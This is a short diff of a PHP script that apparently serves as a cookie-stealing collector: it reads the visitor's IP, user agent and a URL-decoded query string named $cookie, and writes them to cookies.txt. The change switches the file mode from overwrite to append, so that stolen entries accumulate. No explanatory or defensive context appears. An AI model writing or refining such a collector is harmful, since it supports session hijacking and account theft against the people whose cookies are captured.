@@ -3,7 +3,7 @@ $ip = getenv('REMOTE_ADDR');
 $browser = $_SERVER['HTTP_USER_AGENT'];
 $cookie = urldecode($_SERVER['QUERY_STRING']);
 $file = "cookies.txt";
-$fp = fopen($file, 'w');
+$fp = fopen($file, 'a');
  
 fwrite($fp, $browser. PHP_EOL);
  
